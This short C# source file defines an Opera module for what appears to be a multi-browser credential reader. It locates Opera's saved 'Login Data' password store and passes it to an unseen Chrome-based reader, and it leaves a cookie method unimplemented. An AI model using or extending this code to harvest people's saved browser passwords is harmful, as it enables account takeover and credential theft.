using System;
using System.Collections.Generic;
using System.IO;

namespace dao
{
    class Opera : BaseChrome, IReader
    {
        public string BrowserName { get { return "Opera"; } }

        public IEnumerable<PassModel> Passwords()
        {
            string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Opera Software\\Opera Stable\\Login Data");
            return base.Reads("Opera Stable", datapath);
        }

        public IEnumerable<Cookie> Cookies(string host = null)
        {
            throw new NotImplementedException();
        }
    }
}
